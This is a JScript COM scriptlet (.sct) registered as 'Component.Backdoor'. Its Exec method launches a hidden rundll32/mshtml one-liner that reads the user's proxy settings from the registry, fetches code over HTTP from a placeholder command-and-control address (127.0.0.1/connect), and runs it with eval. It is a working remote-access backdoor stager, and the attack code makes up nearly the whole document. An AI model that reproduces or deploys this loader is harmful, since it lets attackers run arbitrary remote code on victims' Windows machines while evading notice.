<?XML version="1.0"?>
<scriptlet>

<registration
    description="Component"
    progid="Component.Backdoor"
    version="1.01"
    classid="{10001111-0000-0000-0000-00000000ACDC}"
>
</registration>

<public>
    <method name="Exec">
    </method>
</public>
<script language="JScript">
<![CDATA[

	function Exec()
	{
		rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
		new ActiveXObject("WScript.Shell").Run(rat,0,true);
//		return rat;
	}
]]>
</script>

</scriptlet>
